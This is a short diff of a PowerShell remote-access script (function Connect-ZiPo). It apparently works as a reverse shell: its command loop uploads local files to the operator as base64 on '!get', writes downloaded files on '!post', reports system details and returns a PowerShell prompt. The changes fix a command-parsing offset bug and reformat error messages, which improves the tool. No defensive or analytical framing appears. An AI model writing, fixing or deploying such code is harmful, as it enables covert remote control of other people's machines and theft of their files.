@@ -7,7 +7,7 @@ function Connect-ZiPo {
             $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
             return "[UPLOAD]::$(Split-Path $path -Leaf)::`n$b64"
         } else {
-            return "[ERROR]::File not found: $path"
+            return "[ERROR]::FILE NOT FOUND: $path"
         }
     }
 
@@ -54,7 +54,7 @@ Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
 
                 try {
                     if ($cmd.StartsWith("!get")) {
-                        $path = $cmd.Substring(7).Trim()
+                        $path = $cmd.Substring(4).Trim()
                         $response = Upload-File $path
                     }
                     elseif ($cmd.StartsWith("!post")) {
@@ -62,7 +62,7 @@ Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         if ($parts.Length -eq 3) {
                             $response = Download-File $parts[1].Trim() $parts[2].Trim()
                         } else {
-                            $response = "[ERROR] Invalid download format"
+                            $response = "[ERROR] INVALID POST FORMAT"
                         }
                     }
                     else {
@@ -72,7 +72,7 @@ Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     }
                 }
                 catch {
-                    $response = "[ERROR] $($_.Exception.Message)"
+                    $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                 }
 
                 $response += "`nPS " + (Get-Location) + "> "
